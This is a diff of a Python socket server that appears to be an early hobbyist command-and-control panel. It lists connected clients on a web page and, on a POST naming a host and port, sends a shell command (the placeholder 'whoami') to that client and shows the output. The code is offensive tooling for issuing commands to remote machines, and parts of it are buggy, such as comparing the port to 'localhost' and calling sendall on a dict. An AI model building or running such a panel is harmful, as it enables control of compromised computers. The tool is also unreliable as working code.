@@ -28,28 +28,48 @@ while True:
     # pdb.set_trace()
     connection, client_addr = sock.accept()
     print(f'New conn from {client_addr}')
-    connections.append({
-        'conn': connection,
-        'ip': client_addr[0],
-        'port': client_addr[1]
-    })
+    if client_addr[1] not in ('localhost', '127.0.0.1'):
+        connections.append({
+            'conn': connection,
+            'ip': client_addr[0],
+            'port': client_addr[1]
+        })
     payload = b'whoami'
     data = connection.recv(1024).decode('utf-8')
-    if data.startswith('GET / ') or data.startswith('GET /favicon.ico'):
+    if data.startswith('GET'):
         print(data)
-        connection.sendall(b'HTTP/1.1 200 OK\r\n\r\n')
+    if data.startswith('GET / '):
+        # payload URLs: POST /b64<payload>?b64<host:port>
+        # add payload input field
+        print(data)
         with open('index.html') as file_:
             template = Template(file_.read())
+        # check connections if actual/exclude web conns
         response = template.render(connections=connections)
+        connection.sendall(b'HTTP/1.1 200 OK\r\n\r\n')
         connection.send(response.encode('utf-8'))
-        # connection.close()
+        connection.close()
         continue
-    if not data: break
+    elif data.startswith('GET /favicon'):
+        connection.sendall(b'HTTP/1.1 404 Not Found\r\n\r\n')
+        connection.close()
+    elif data.startswith('POST /'):
+        # encode payload b64
+        # payload: POST /b64<payload>?b64<host:port>
+        host, port = data.split()[1].split('?')[1].split(':')
+        connection = None
+        for conn in connections:
+            if conn['ip'] == host and conn['port'] == port:
+                connection = conn
+            # payload
+        print(f'sending payload to {host}: >> {payload}')
+        connection.sendall(payload)
+        # render payload result
+        response_data = connection.recv(1024)
+        print(response_data)
+        response = template.render(response=response_data)
+        connection.sendall(b'HTTP/1.1 200 OK\r\n\r\n')
+        connection.send(response.encode('utf-8'))
+    elif not data: break  # else?
     print(data)
     print(f'{client_addr}: << {data}')
-    # payload
-    print(f'sending payload to {client_addr}: >> {payload}')
-    connection.sendall(payload)
-    # render payload result
-    response_data = connection.recv(1024)
-    print(response_data)
